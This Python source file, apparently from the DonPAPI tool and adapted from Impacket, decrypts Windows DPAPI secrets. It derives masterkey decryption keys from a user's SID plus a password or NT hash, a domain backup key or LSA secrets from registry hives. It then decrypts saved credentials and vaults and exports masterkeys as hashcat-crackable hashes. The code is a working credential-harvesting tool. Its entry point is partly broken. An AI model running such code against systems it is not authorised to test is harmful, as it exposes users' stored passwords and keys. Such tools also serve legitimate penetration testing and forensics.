#!/usr/bin/env python
# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Author:
# Pierre-Alexandre Vandewoestyne (@T00uF)
# Mostly the work of the great Alberto Solino (@agsolino)
#
# Description:
#       Example for using the DPAPI/Vault structures to unlock Windows Secrets.
#
# Examples:
#
#   You can unlock masterkeys, credentials and vaults. For the three, you will specify the file name (using -file for
#   masterkeys and credentials, and -vpol and -vcrd for vaults).
#   If no other parameter is sent, the contents of these resource will be shown, with their encrypted data as well.
#   If you specify a -key blob (in the form of '0xabcdef...') that key will be used to decrypt the contents.
#   In the case of vaults, you might need to also provide the user's sid (and the user password will be asked).
#   For system secrets, instead of a password you will need to specify the system and security hives.
#
# References: All of the work done by these guys. I just adapted their work to my needs.
#       https://www.passcape.com/index.php?section=docsys&cmd=details&id=28
#       https://github.com/jordanbtucker/dpapick
#       https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials (and everything else Ben did )
#       http://blog.digital-forensics.it/2016/01/windows-revaulting.html
#       https://www.passcape.com/windows_password_recovery_vault_explorer
#       https://www.passcape.com/windows_password_recovery_dpapi_master_key
#
from __future__ import division
from __future__ import print_function

import struct
import argparse
import logging
import sys
import re
from binascii import unhexlify, hexlify
from hashlib import pbkdf2_hmac
from impacket import LOG
from Cryptodome.Cipher import AES, PKCS1_v1_5
from Cryptodome.Hash import HMAC, SHA1, MD4
from impacket.uuid import bin_to_string
from impacket import crypto
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5 import lsad
from impacket import version
from impacket.examples import logger
from impacket.examples.secretsdump import LocalOperations, LSASecrets
from impacket.structure import hexdump
from impacket.dpapi import *
from donpapi.lib.toolbox import bcolors

"""MasterKeyFile, MasterKey, CredHist, DomainKey, CredentialFile, DPAPI_BLOB, \
	CREDENTIAL_BLOB, VAULT_VCRD, VAULT_VPOL, VAULT_KNOWN_SCHEMAS, VAULT_VPOL_KEYS, P_BACKUP_KEY, PREFERRED_BACKUP_KEY, \
	PVK_FILE_HDR, PRIVATE_KEY_BLOB, privatekeyblob_to_pkcs1, DPAPI_DOMAIN_RSA_MASTER_KEY
"""


def is_password_hash(password):
	#TODO
	if len(password)==32 :#NT hash
		return True
	#is sha1, MD4, sha256
	return 0

#From GentilKiwi https://github.com/gentilkiwi/mimikatz/blob/fe4e98405589e96ed6de5e05ce3c872f8108c0a0/modules/kull_m_key.h#L18-L38
class CapiCertBlob(Structure):
    structure = (
        ('Version', '<L=0'),
        ('unk0', '<L=0'),
        ('dwNameLen', '<L=0'),
        ('dwSiPublicKeyLen', '<L=0'),
        ('dwSiPrivateKeyLen', '<L=0'),
        ('dwExPublicKeyLen', '<L=0'),
        ('dwExPrivateKeyLen', '<L=0'),
        ('dwHashLen', '<L=0'),
        ('dwSiExportFlagLen', '<L=0'),
        ('dwExExportFlagLen', '<L=0'),

        ('_pName', '_-pName', 'self["dwNameLen"]'),
        ('pName', ':'),
        ('_pHash', '_-pHash', 'self["dwHashLen"]'),
        ('pHash', ':'),

        ('_Blob', '_-Blob', 'self["KeySize"]'),
        ('Blob', ':', DPAPI_BLOB),
    )

class CngCertBlob(Structure):
    structure = (
        ('Version', '<L=0'),
        ('unk0', '<L=0'),
        ('dwNameLen', '<L=0'),
        ('type', '<L=0'),
        ('dwPublicPropertiesLen', '<L=0'),
        ('dwPrivatePropertiesLen', '<L=0'),
        ('dwPrivateKeyLen', '<L=0'),
        ('dwHashLen', "16s=b"""),

        ('_pName', '_-pName', 'self["dwNameLen"]'),
        ('pName', ':'),
        ('_pPublicProperties', '_-pPublicProperties', 'self["dwPublicPropertiesLen"]'),
        ('pPublicProperties', ':'),
        ('_pPrivateProperties', '_-pPPrivateProperties', 'self["dwPrivatePropertiesLen"]'),
        ('pPrivateProperties', ':'),
        ('_Blob', '_-Blob', 'self["dwPrivateKeyLen"]'),
        ('Blob', ':', DPAPI_BLOB),
    )



class DPAPI:
	def __init__(self, options,logger):
		self.options = options
		self.dpapiSystem = None
		self.logging= logger
		self.logging.debug(f"init DPAPI()")
		self.data = None

	def getDPAPI_SYSTEM(self,secretType, secret):
		if secret.startswith("dpapi_machinekey:"):
			machineKey, userKey = secret.split('\n')
			machineKey = machineKey.split(':')[1]
			userKey = userKey.split(':')[1]
			self.dpapiSystem = {}
			self.dpapiSystem['MachineKey'] = unhexlify(machineKey[2:])
			self.dpapiSystem['UserKey'] = unhexlify(userKey[2:])

	def getLSA(self):
		localOperations = LocalOperations(self.options.system)
		bootKey = localOperations.getBootKey()
		lsaSecrets = LSASecrets(self.options.security, bootKey, None, isRemote=False, history=False, perSecretCallback = self.getDPAPI_SYSTEM)
		lsaSecrets.dumpSecrets()

	def deriveKeysFromUser(self, sid, password):
		try:
			self.logging.debug(f"deriveKeysFromUser SID : {sid} with password {password}")
			# Will generate two keys, one with SHA1 and another with MD4
			key1 = HMAC.new(SHA1.new(password.encode('utf-16le')).digest(), (sid + '\0').encode('utf-16le'), SHA1).digest()
			key2 = HMAC.new(MD4.new(password.encode('utf-16le')).digest(), (sid + '\0').encode('utf-16le'), SHA1).digest()
			# For Protected users
			tmpKey = pbkdf2_hmac('sha256', MD4.new(password.encode('utf-16le')).digest(), sid.encode('utf-16le'), 10000)
			tmpKey2 = pbkdf2_hmac('sha256', tmpKey, sid.encode('utf-16le'), 1)[:16]
			key3 = HMAC.new(tmpKey2, (sid + '\0').encode('utf-16le'), SHA1).digest()[:20]
		except Exception as e:
			self.logging.debug(f"derivekey exception : {str(e)}")
		return key1, key2, key3

	def deriveKeysFromUserkey(self, sid, pwdhash):
		try:
			if len(pwdhash) == 20:
				# SHA1
				key1 = HMAC.new(pwdhash, (sid + '\0').encode('utf-16le'), SHA1).digest()
				key2 = None
			else:
				# Assume MD4
				key1 = HMAC.new(pwdhash.encode('utf-16le'), (sid + '\0').encode('utf-16le'), SHA1).digest()
				# For Protected users
				tmpKey = pbkdf2_hmac('sha256', pwdhash, sid.encode('utf-16le'), 10000)
				tmpKey2 = pbkdf2_hmac('sha256', tmpKey, sid.encode('utf-16le'), 1)[:16]
				key2 = HMAC.new(tmpKey2, (sid + '\0').encode('utf-16le'), SHA1).digest()[:20]
		except Exception as e:
			self.logging.error(f"derivekey exception : {str(e)}")
		return key1, key2


	def get_masterkey_hash(self,generate_hash=False):
		# Open masterkey
		self.logging.debug("Opening masterkey file %s" % self.options.file)
		fp = open(self.options.file, 'rb')
		data = fp.read()
		mkf = MasterKeyFile(data)
		# mkf.dump()
		data = data[len(mkf):]
		dk = None
		#Context = local or domain
		hashes=[]
		if mkf['MasterKeyLen'] > 0:
			mk = MasterKey(data[:mkf['MasterKeyLen']])
			data = data[len(mk):]
			self.logging.debug("[MASTERKEY]")
			self.logging.debug("Version     : %8x (%d)" % (mk['Version'], mk['Version']))
			self.logging.debug("Salt        : %s" % hexlify(mk['Salt']))
			self.logging.debug("Rounds      : %8x (%d)" % (mk['MasterKeyIterationCount'], mk['MasterKeyIterationCount']))
			self.logging.debug("HashAlgo    : %.8x (%d) (%s)" % (
			mk['HashAlgo'], mk['HashAlgo'], ALGORITHMS(mk['HashAlgo']).name))
			self.logging.debug("CryptAlgo   : %.8x (%d) (%s)" % (
			mk['CryptAlgo'], mk['CryptAlgo'], ALGORITHMS(mk['CryptAlgo']).name))
			self.logging.debug("data        : %s" % (hexlify(mk['data'])))

			#Generate Dump
			#
			#On peut voir si le compte est un compte domaine via l'existance d'infos de domainkey
			is_domain_user=False
			# Context = local or domain
			if mkf['DomainKeyLen'] > 0:
				contexts = [2,3]
				is_domain_user=True
			else :
				contexts = [1]
			if self.options.sid :

				#self.logging.debug(ALGORITHMS(mk['CryptAlgo']).name)
				#self.logging.debug(ALGORITHMS(mk['HashAlgo']).name)
				if ALGORITHMS(mk['CryptAlgo']).name=="CALG_3DES":
					crypt_algo="des3"
				if ALGORITHMS(mk['CryptAlgo']).name=="CALG_AES_256":
					crypt_algo="aes256"
				if ALGORITHMS(mk['HashAlgo']).name == "CALG_HMAC" or ALGORITHMS(mk['HashAlgo']).name =="CALG_SHA1":
					hash_algo="sha1"
				if ALGORITHMS(mk['HashAlgo']).name == "CALG_SHA_512":
					hash_algo="sha512"
				if crypt_algo=="des3" and hash_algo=="sha1" and len(hexlify(mk['data']))==208:
					version=1
					self.logging.debug(f"MKF version {mk['Version']} detected : with Crypto {ALGORITHMS(mk['CryptAlgo']).name} and hash {ALGORITHMS(mk['HashAlgo']).name}")
				elif crypt_algo=="aes256" and hash_algo=="sha512" and len(hexlify(mk['data']))==288:
					version=2
					self.logging.debug(f"MKF version {mk['Version']} detected : with Crypto {ALGORITHMS(mk['CryptAlgo']).name} and hash {ALGORITHMS(mk['HashAlgo']).name}")
				else:
					self.logging.debug(f"Unsupported Crypto/hash version : {ALGORITHMS(mk['CryptAlgo']).name} : {ALGORITHMS(mk['HashAlgo']).name} with data length of {len(hexlify(mk['data']))}")
				for context in contexts:	#version=mk['Version'] == MKF Version // 1=hashcat 15300 / 2=hashcat 15900
					hashcat_hash=f"$DPAPImk${version}*{context}*{self.options.sid}*{crypt_algo}*{hash_algo}*{mk['MasterKeyIterationCount']}*{hexlify(mk['Salt']).decode('UTF-8')}*{len(hexlify(mk['data']))}*{hexlify(mk['data']).decode('UTF-8')}"
					self.logging.debug(hashcat_hash)
					hashes.append(hashcat_hash)
					#Save hashes in database
					#add_dpapi_hash(file_path='', sid='', guid='', hash='',context='', pillaged_from_computerid=None,pillaged_from_computer_ip=None)

			else :
				self.logging.debug('SID needed to generate hash file')
				return [],is_domain_user
		return hashes, is_domain_user

	def decrypt_masterkey(self,passwords=[]):
		#Open masterkey
		self.logging.debug("Opening masterkey file %s"%self.options.file)
		fp = open(self.options.file, 'rb')
		data = fp.read()
		mkf = MasterKeyFile(data)
		#mkf.dump()
		data = data[len(mkf):]
		dk=None
		if mkf['MasterKeyLen'] > 0:
			mk = MasterKey(data[:mkf['MasterKeyLen']])
			data = data[len(mk):]

		if mkf['BackupKeyLen'] > 0:
			bkmk = MasterKey(data[:mkf['BackupKeyLen']])
			data = data[len(bkmk):]

		if mkf['CredHistLen'] > 0:
			ch = CredHist(data[:mkf['CredHistLen']])
			data = data[len(ch):]

		if mkf['DomainKeyLen'] > 0:
			dk = DomainKey(data[:mkf['DomainKeyLen']])
			data = data[len(dk):]

		if self.options.pvk and dk!=None:
			self.logging.debug("Opening Domain Master Backup File %s" % self.options.pvk)
			pvkfile = open(self.options.pvk, 'rb').read()
			key = PRIVATE_KEY_BLOB(pvkfile[len(PVK_FILE_HDR()):])
			private = privatekeyblob_to_pkcs1(key)
			cipher = PKCS1_v1_5.new(private)

			decryptedKey = cipher.decrypt(dk['SecretData'][::-1], None)
			if decryptedKey:
				try:
					domain_master_key = DPAPI_DOMAIN_RSA_MASTER_KEY(decryptedKey)
					key = domain_master_key['buffer'][:domain_master_key['cbMasterKey']]
					self.logging.debug('Decrypted key with domain backup key provided')
					self.logging.debug('Decrypted key: 0x%s' % hexlify(key).decode('latin-1'))
					return '0x%s' % hexlify(key).decode('latin-1')
				except:  # on extrait l'info en dur
					self.logging.debug('excepted, maybe because of a known DPAPI_PVK fuckup. trying to adjust ... ')
					key = decryptedKey[8:96 + 8 - 32]
					self.logging.debug('Decrypted key: 0x%s' % hexlify(key).decode('latin-1'))
					return '0x%s' % hexlify(key).decode('latin-1')
			else:
				logging.debug("Error in decryptedKey with PVK")
		# Lets try to decrypt it with another method
		# return -1
		if self.options.key and self.options.sid: #LSA machine/user Key + SID
			self.logging.debug("Decrypting with SID and key")
			key = unhexlify(self.options.key[2:])
			key1, key2 = self.deriveKeysFromUserkey(self.options.sid, key)
			decryptedKey = mk.decrypt(key1)
			if decryptedKey:
				self.logging.debug('Decrypted key with key provided + SID')
				self.logging.debug('Decrypted key: 0x%s' % hexlify(decryptedKey).decode('latin-1'))
				return '0x%s' % hexlify(decryptedKey).decode('latin-1')
			decryptedKey = mk.decrypt(key2)
			if decryptedKey:
				self.logging.debug('Decrypted key with key provided + SID')
				self.logging.debug('Decrypted key: 0x%s' % hexlify(decryptedKey).decode('latin-1'))
				return '0x%s' % hexlify(decryptedKey).decode('latin-1')
		if self.options.key:
			self.logging.debug(f"Decrypting with key {self.options.key}")
			key = unhexlify(self.options.key[2:])
			decryptedKey = mk.decrypt(key)
			if decryptedKey:
				self.logging.debug('Decrypted key with key provided')
				self.logging.debug('Decrypted key: 0x%s' % hexlify(decryptedKey).decode('latin-1'))
				return '0x%s' % hexlify(decryptedKey).decode('latin-1')
		if self.options.sid :#and self.options.key is None:
			self.logging.debug(f'Decrypting with SID {self.options.sid} and Password {self.options.password}')
			# Do we have a password?
			for password in passwords:
				#Password or hash ? # TODO
				if is_password_hash(password):
					self.logging.debug(f"Trying with hash = {password}")
					pwdhash=password
					key1, key2=self.deriveKeysFromUserkey(self.options.sid, pwdhash)
					key3=None
				else:
					self.logging.debug(f"Trying with Password= {password}")
					key1, key2, key3 = self.deriveKeysFromUser(self.options.sid, password)
					self.logging.debug(f'Got \nkey1:{key1}\nkey2:{key2}\nkey3:{key3}')
					# if mkf['flags'] & 4 ? SHA1 : MD4
				if mkf['MasterKeyLen'] > 0:
					decryptedKey = mk.decrypt(key3)
					if decryptedKey:
						self.logging.debug('Decrypted key with User Key (MD4 protected)')
						self.logging.debug('Decrypted key: 0x%s' % hexlify(decryptedKey).decode('latin-1'))
						return '0x%s' % hexlify(decryptedKey).decode('latin-1')

					decryptedKey = mk.decrypt(key2)
					if decryptedKey:
						self.logging.debug('Decrypted key with User Key (MD4)')
						self.logging.debug('Decrypted key: 0x%s' % hexlify(decryptedKey).decode('latin-1'))
						return '0x%s' % hexlify(decryptedKey).decode('latin-1')

					decryptedKey = mk.decrypt(key1)
					if decryptedKey:
						self.logging.debug('Decrypted key with User Key (SHA1)')
						self.logging.debug('Decrypted key: 0x%s' % hexlify(decryptedKey).decode('latin-1'))
						return '0x%s' % hexlify(decryptedKey).decode('latin-1')
				if mkf['BackupKeyLen'] > 0:
					decryptedKey = bkmk.decrypt(key3)
					if decryptedKey:
						self.logging.debug('Decrypted Backup key with User Key (MD4 protected)')
						self.logging.debug('Decrypted key: 0x%s' % hexlify(decryptedKey).decode('latin-1'))
						return '0x%s' % hexlify(decryptedKey).decode('latin-1')

					decryptedKey = bkmk.decrypt(key2)
					if decryptedKey:
						self.logging.debug('Decrypted Backup key with User Key (MD4)')
						self.logging.debug('Decrypted key: 0x%s' % hexlify(decryptedKey).decode('latin-1'))
						return '0x%s' % hexlify(decryptedKey).decode('latin-1')

					decryptedKey = bkmk.decrypt(key1)
					if decryptedKey:
						self.logging.debug('Decrypted Backup key with User Key (SHA1)')
						self.logging.debug('Decrypted key: 0x%s' % hexlify(decryptedKey).decode('latin-1'))
						return '0x%s' % hexlify(decryptedKey).decode('latin-1')
			else:
				self.logging.debug('Password not found')
				return -1

	def find_CredentialFile_masterkey(self,raw_data=None):
		if self.options.file is not None: #Policy file
			try:
				self.logging.debug("Opening BLOB file %s" % self.options.file)
				fp = open(self.options.file, 'rb')
				self.data = fp.read()
				fp.close()
			except Exception as ex:
				self.logging.debug("Exception in dpapi.py find_Blob_masterkey 1 ")
				self.logging.debug(ex)
		elif raw_data is not None:
			self.data = raw_data
		if self.data == None:
			self.logging.debug("No Data in dpapi.py find_CredentialFile_masterkey ")
		try:
			cred = CredentialFile(self.data)
			blob = DPAPI_BLOB(cred['Data'])
			self.logging.debug("got blob %r" % blob)
			used_masterkey = bin_to_string(blob['GuidMasterKey'])
			return used_masterkey.lower()
		except Exception as ex:
			self.logging.debug("Exception in dpapi.py find_CredentialFile_masterkey ")
			self.logging.debug(ex)

	def find_Blob_masterkey(self,raw_data=None):
		if self.options.file is not None: #Policy file
			try:
				self.logging.debug("Opening BLOB file %s" % self.options.file)
				fp = open(self.options.file, 'rb')
				self.data = fp.read()
				fp.close()
			except Exception as ex:
				self.logging.debug("Exception in dpapi.py find_Blob_masterkey 1 ")
				self.logging.debug(ex)
		elif raw_data is not None :
			self.data= raw_data
		if self.data == None:
			self.logging.debug("No Data in dpapi.py find_Blob_masterkey ")
		try:
				#cred = CredentialFile(data)
				#blob = DPAPI_BLOB(cred['Data'])
				blob = DPAPI_BLOB(self.data)
				self.logging.debug("got blob %r" % blob)
				used_masterkey = bin_to_string(blob['GuidMasterKey'])
				return used_masterkey.lower()
		except Exception as ex:
			self.logging.debug("Exception in dpapi.py find_Blob_masterkey 2")
			self.logging.debug(ex)

	def find_Vault_Masterkey(self,raw_data=None):
		if self.options.vpol is not None: #Policy file
			try:
				self.logging.debug("Opening Policy BLOB file %s" % self.options.vpol)
				fp = open(self.options.vpol, 'rb')
				self.data = fp.read()
				fp.close()
			except Exception as ex:
				self.logging.debug("Exception in dpapi.py find_Blob_masterkey 1 ")
				self.logging.debug(ex)
		elif raw_data is not None:
			self.data = raw_data
		if self.data == None:
			self.logging.debug("No Data in dpapi.py find_Vault_Masterkey ")
		try:
			vpol = VAULT_VPOL(self.data)
			blob = vpol['Blob']
			#vpol.dump()
			used_masterkey = bin_to_string(blob['GuidMasterKey'])
			return used_masterkey.lower()
		except Exception as ex:
				self.logging.debug("Exception in dpapi.py find_Vault_Masterkey ")
				self.logging.debug(ex)

	def decrypt_credential(self,raw_data=None):
		if self.options.file is not None:  # Policy file
			try:
				self.logging.debug("Opening BLOB file %s" % self.options.file)
				fp = open(self.options.file, 'rb')
				self.data = fp.read()
				fp.close()
			except Exception as ex:
				self.logging.debug("Exception in dpapi.py find_Blob_masterkey 1 ")
				self.logging.debug(ex)
		elif raw_data is not None:
			self.data = raw_data
		if self.data == None:
			self.logging.debug("No Data in dpapi.py decrypt_credential ")
		try:
			cred = CredentialFile(self.data)
			blob = DPAPI_BLOB(cred['Data'])
			self.logging.debug("got blob %r" % blob)
			used_masterkey=bin_to_string(blob['GuidMasterKey'])
			self.logging.debug(f"Bloob is encrypted with MasterKey : {used_masterkey}")
			if self.options.key is not None:
				self.logging.debug("Key was given to DPAPI.decrypt_credential() - using key %s"%self.options.key)
				key = unhexlify(self.options.key[2:])
				#self.logging.debug("With key %s"%hexlify(key))
				decrypted = blob.decrypt(key)
				if decrypted is not None:
					creds = CREDENTIAL_BLOB(decrypted)
					#creds.dump()
					return creds
			else:
				# Just print the data
				self.logging.debug("NO Key was given to DPAPI.decrypt_credential() ")
				blob.dump()
				return None
		except Exception as ex:
			self.logging.debug("Exception in dpapi.py decrypt_credential")
			self.logging.debug(ex)
			return None

	def decrypt_blob(self,raw_data=None,entropy=None):
		if self.options.file is not None:  # Blob file
			try:
				self.logging.debug("Opening BLOB file %s" % self.options.file)
				fp = open(self.options.file, 'rb')
				self.data = fp.read()
				fp.close()
			except Exception as ex:
				self.logging.debug("Exception in dpapi.py decrypt_blob 1 ")
				self.logging.debug(ex)
		elif raw_data is not None:
			self.data = raw_data
		if self.data is None:
			self.logging.debug("No Data in dpapi.py decrypt_blob ")
			return None
		try:
			blob = DPAPI_BLOB(self.data)
			self.logging.debug("got blob %r" % blob)
			used_masterkey=bin_to_string(blob['GuidMasterKey'])
			self.logging.debug(f"Bloob is encrypted with MasterKey : {used_masterkey}")
			if self.options.key is not None:
				self.logging.debug("Key was given to DPAPI.decrypt_blob() - using key %s"%self.options.key)
				key = unhexlify(self.options.key[2:])
				self.logging.debug("With key %s"%hexlify(key))
				if entropy is not None:
					decrypted = blob.decrypt(key,entropy=entropy)
				else:
					decrypted = blob.decrypt(key)
				#self.logging.debug(decrypted)
				if decrypted is not None:
					return decrypted
			else:
				# Just print the data
				self.logging.debug("NO Key was given to DPAPI.decrypt_blob() ")
				blob.dump()
				return None
		except Exception as ex:
			self.logging.debug("Exception in dpapi.py decrypt_blob")
			self.logging.debug(ex)
			return None

	def decrypt_vault(self):
		self.logging.debug('[-]dpapi.py decrypt_vault()')
		if self.options.vcrd is None and self.options.vpol is None:
			self.logging.debug('You must specify either -vcrd or -vpol parameter. Type --help for more info')
			return None

		elif self.options.vpol is not None: #Policy file
			try:
				fp = open(self.options.vpol, 'rb')
				data = fp.read()
				vpol = VAULT_VPOL(data)
				blob = vpol['Blob']
				#vpol.dump()
				self.logging.debug("Looking for MasterKey   : %s" % bin_to_string(blob['GuidMasterKey']))
				if self.options.key is not None:
					self.logging.debug("Key was given to DPAPI.decrypt_vault() - using key %s" % self.options.key)
					key = unhexlify(self.options.key[2:])
					# self.logging.debug("With key %s"%hexlify(key))
					#blob = vpol['Blob']
					data = blob.decrypt(key)
					if data is not None:
						keys = VAULT_VPOL_KEYS(data)
						#keys.dump()
						return keys
					"""
					elif self.options.masterkeys is not None:
						for masterkey in self.options.masterkeys:
							self.logging.debug("Testing masterkey %s" % masterkey)
							if bin_to_string(blob['GuidMasterKey']).upper() in masterkey.upper():
								self.logging.debug("Masterkey %s found" % bin_to_string(blob['GuidMasterKey']))
								if self.options.masterkeys[masterkey] == None:
									self.logging.debug(f"{bcolors.FAIL}[+]Error : This key was not decrypted{bcolors.ENDC}")
									return None
								key = unhexlify(self.options.masterkeys[masterkey][2:])
								self.logging.debug("Starting decryption With key %s" % hexlify(key))
								data = blob.decrypt(key)
								if data is not None:
									keys = VAULT_VPOL_KEYS(data)
									keys.dump()
									return keys
					"""

				else:
					# Just print the data
					self.logging.debug("NO Key was given to DPAPI.decrypt_vault()")
					#vpol.dump()
					return -1
			except Exception as ex:
				self.logging.debug("Exception in dpapi.py decrypt VPOL VAULT")
				self.logging.debug(ex)

		elif self.options.vcrd is not None:#Vault file
			fp = open(self.options.vcrd, 'rb')
			data = fp.read()
			blob = VAULT_VCRD(data)
			keyz=[]
			try:
				if self.options.vaultkeys is not None:
					for key in self.options.vaultkeys:
						keyz.append(unhexlify(key[2:]))
				if self.options.key is not None:
					keyz.append(unhexlify(self.options.key[2:]) )
			except Exception as ex:
				self.logging.debug("Exception in dpapi.py decrypt VCRD VAULT - getting keyz")
				self.logging.debug(ex)

			for key in keyz:
				try:
					cleartext = None
					for i, entry in enumerate(blob.attributesLen):
						if entry > 28:
							attribute = blob.attributes[i]
							if 'IV' in attribute.fields and len(attribute['IV']) == 16:
								cipher = AES.new(key, AES.MODE_CBC, iv=attribute['IV'])
							else:
								cipher = AES.new(key, AES.MODE_CBC)
							cleartext = cipher.decrypt(attribute['Data'])

					if cleartext is not None:
						# Lookup schema Friendly Name and print if we find one
						if blob['FriendlyName'].decode('utf-16le')[:-1] in VAULT_KNOWN_SCHEMAS:#************INTEGRER les SCHEMA
							# Found one. Cast it and print
							vault = VAULT_KNOWN_SCHEMAS[blob['FriendlyName'].decode('utf-16le')[:-1]](cleartext)
							return vault,blob['FriendlyName'].decode('utf-16le')[:-1]
						else:
							# otherwise
							self.logging.debug(f"Unknown VAULT SCHEMA - VCRD VAULT {self.options.vcrd}")
							hexdump(cleartext)
						return cleartext,''

				except Exception as ex:
					self.logging.debug(f"Exception in dpapi.py decrypt VCRD VAULT - Couldn't decrypt vault {self.options.vcrd}")
					self.logging.debug(ex)
			else:
				blob.dump()
				return None, None
'''
class CredHistFile:
	def __init__(self, raw):
		self.data = raw
		self.header = CredHist(self.data)
		self.data = self.data[24:]
		self.entries_list = []
		self.entries = {}

	def get_entries(self):
		while True:
			l = self.data.pop("L")
			if l == 0:
				break
			self.addEntry(self.data.pop_string(l - 4))

		self.footmagic = self.data.eat("L")
		self.curr_guid = "%0x-%0x-%0x-%0x%0x-%0x%0x%0x%0x%0x%0x" % self.data.eat("L2H8B")


	def addEntry(self, blob):
		"""Creates a CredhistEntry object with blob then adds it to the store"""
		x = CredhistEntry(blob)
		self.entries[x.guid] = x
		self.entries_list.append(x)


class CredHist(Structure):
    structure = (
        ('Version', '<L=0'),
        ('Guid', "16s=b''"),
    )
    def dump(self):
        print("[CREDHIST]")
        print("Version       : %8x (%d)" % (self['Version'], self['Version']))
        print("Guid          : %s" % bin_to_string(self['Guid']))
        print()

CryptoAlgo.add_algo(0x6601, name="DES", keyLength=64, blockLength=64, IVLength=64, module=des,keyFixup=des_set_odd_parity)
CryptoAlgo.add_algo(0x6603, name="DES3", keyLength=192, blockLength=64, IVLength=64, module=triple_des,keyFixup=des_set_odd_parity)
CryptoAlgo.add_algo(0x6611, name="AES", keyLength=128, blockLength=128, IVLength=128)
CryptoAlgo.add_algo(0x660e, name="AES-128", keyLength=128, blockLength=128, IVLength=128)
CryptoAlgo.add_algo(0x660f, name="AES-192", keyLength=192, blockLength=128, IVLength=128)
CryptoAlgo.add_algo(0x6610, name="AES-256", keyLength=256, blockLength=128, IVLength=128)
CryptoAlgo.add_algo(0x8009, name="HMAC", digestLength=160, blockLength=512)
CryptoAlgo.add_algo(0x8003, name="md5", digestLength=128, blockLength=512)
CryptoAlgo.add_algo(0x8004, name="sha1", digestLength=160, blockLength=512)
CryptoAlgo.add_algo(0x800c, name="sha256", digestLength=256, blockLength=512)
CryptoAlgo.add_algo(0x800d, name="sha384", digestLength=384, blockLength=1024)
CryptoAlgo.add_algo(0x800e, name="sha512", digestLength=512, blockLength=1024)


class CredhistEntry(Structure):
    structure = (
        ('revision', '<L=0'),
        ('hashAlgo', '<L=0'),
        ('rounds', '<L=0'),
        ('xxx', '<L=0'),
        ('cipherAlgo', '<L=0'),
        ('shaHashLen', '<L=0'),
        ('ntHashLen', '<L=0'),
        ('iv', "16s=b''"),
    )


    def parse(self, data):
        self.revision = data.eat("L")
        self.hashAlgo = data.eat("L")
        self.rounds = data.eat("L")
        data.eat("L")
        self.cipherAlgo = data.eat("L")
        self.shaHashLen = data.eat("L")
        self.ntHashLen = data.eat("L")
        self.iv = data.eat("16s")

        self.userSID = RPC_SID()
        self.userSID.parse(data)

        n = self.shaHashLen + self.ntHashLen
        n += -n % self.cipherAlgo.blockSize
        self.encrypted = data.eat_string(n)

        self.revision2 = data.eat("L")
        self.guid = b"%0x-%0x-%0x-%0x%0x-%0x%0x%0x%0x%0x%0x" % data.eat("L2H8B")
'''


if __name__ == '__main__':
	# Init the example's logger theme
	logger.init()
	LOG.debug(version.BANNER)

	parser = argparse.ArgumentParser(add_help=True, description="Nose")
	parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
	subparsers = parser.add_subparsers(help='actions', dest='action')

	# A domain backup key command
	backupkeys = subparsers.add_parser('backupkeys', help='domain backup key related functions')
	backupkeys.add_argument('-t', '--target', action='store', required=True, help='[[domain/]username[:password]@]<targetName or address>')
	backupkeys.add_argument('-k', action='store_true', required=False, help='use kerberos')
	backupkeys.add_argument('--export', action='store_true', required=False, help='export keys to file')

	# A masterkey command
	masterkey = subparsers.add_parser('masterkey', help='masterkey related functions')
	masterkey.add_argument('-file', action='store', required=True, help='Master Key File to parse')
	masterkey.add_argument('-sid', action='store', help='SID of the user')
	masterkey.add_argument('-pvk', action='store', help='Domain backup privatekey to use for decryption')
	masterkey.add_argument('-key', action='store', help='Specific key to use for decryption')
	masterkey.add_argument('-password', action='store', help='User\'s password. If you specified the SID and not the password it will be prompted')
	masterkey.add_argument('-system', action='store', help='SYSTEM hive to parse')
	masterkey.add_argument('-security', action='store', help='SECURITY hive to parse')

	# A credential command
	credential = subparsers.add_parser('credential', help='credential related functions')
	credential.add_argument('-file', action='store', required=True, help='Credential file')
	credential.add_argument('-key', action='store', required=False, help='Key used for decryption')

	# A vault command
	vault = subparsers.add_parser('vault', help='vault credential related functions')
	vault.add_argument('-vcrd', action='store', required=False, help='Vault Credential file')
	vault.add_argument('-vpol', action='store', required=False, help='Vault Policy file')
	vault.add_argument('-key', action='store', required=False, help='Master key used for decryption')

	options = parser.parse_args()

	if len(sys.argv)==1:
		parser.print_help()
		sys.exit(1)

	if options.debug is True:
		logging.getLogger().setLevel(logging.DEBUG)
	else:
		logging.getLogger().setLevel(logging.INFO)


	try:
		executer = DPAPI(options)
		executer.run()
	except Exception as e:
		if logging.getLogger().level == logging.DEBUG:
			import traceback
			traceback.print_exc()
		LOG.debug(str(e))
